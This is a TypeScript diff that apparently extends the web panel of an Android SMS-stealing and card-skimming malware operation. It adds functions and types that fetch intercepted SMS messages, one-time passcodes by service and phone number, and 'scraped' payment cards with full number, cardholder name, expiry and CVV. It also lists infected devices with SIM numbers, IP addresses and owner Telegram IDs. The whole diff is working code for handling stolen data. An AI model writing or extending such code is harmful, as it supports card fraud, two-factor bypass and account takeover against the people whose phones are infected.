@@ -146,3 +146,74 @@ export const deleteSms = (deviceId: string, key: string) =>
     `/api/panel/sms/${encodeURIComponent(deviceId)}/${encodeURIComponent(key)}`,
     { method: "DELETE" }
   );
+
+export interface SmsRow {
+  deviceId: string;
+  deviceModel: string;
+  devicePhone: string;
+  pushKey: string;
+  from: string;
+  body: string;
+  date: number;
+  dbLabel: string;
+}
+
+export const getSms = () =>
+  apiFetch<{ success: boolean; sms: SmsRow[] }>("/api/panel/sms");
+
+export interface OtpRow {
+  code: string;
+  service: string;
+  number: string;
+  from: string;
+  body: string;
+  deviceId: string;
+  date: number;
+}
+
+export const getOtps = () =>
+  apiFetch<{
+    success: boolean;
+    otps: OtpRow[];
+    devices: {
+      id: string;
+      model: string;
+      isOnline: boolean;
+      numbers: string[];
+    }[];
+  }>("/api/panel/otps");
+
+export interface ScrapedCard {
+  deviceId: string;
+  deviceModel: string;
+  devicePhone: string;
+  ownerTelegramId: string | null;
+  cardNumber: string;
+  cardholderName: string;
+  expiry: string;
+  cvv: string;
+  ip: string;
+  timestamp: string;
+}
+
+export interface ScrapedDevice {
+  deviceId: string;
+  model: string;
+  phone: string;
+  sim1: string;
+  sim2: string;
+  battery: string;
+  ip: string;
+  storage: string;
+  androidV: string;
+  joined: string;
+  status: boolean;
+  ownerTelegramId: string | null;
+}
+
+export const getScraped = () =>
+  apiFetch<{
+    success: boolean;
+    cards: ScrapedCard[];
+    devices: ScrapedDevice[];
+  }>("/api/panel/scraped");
